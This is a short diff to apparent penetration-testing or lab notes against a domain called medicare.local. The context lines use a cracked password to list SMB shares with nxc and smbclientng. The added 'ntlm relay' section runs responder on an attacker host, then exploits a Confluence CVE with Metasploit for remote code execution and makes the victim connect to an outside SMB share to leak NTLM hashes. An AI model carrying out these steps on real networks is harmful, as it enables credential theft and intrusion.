@@ -33,3 +33,19 @@ john hash --show
 
 nxc smb medicare.local -u "allegra.dosi" -p "123123" --shares
 smbclientng -u  allegra.dosi -p "123123" -d medicare.local --host medicare.local
+
+
+## ntlm relay
+
+on purple =>
+
+responder -I eth1 -wb
+
+on victim =>
+
+exploit cve on confluence with metasploit
+make rce
+shell
+powershell
+dir \\192.168.10.50\test
+
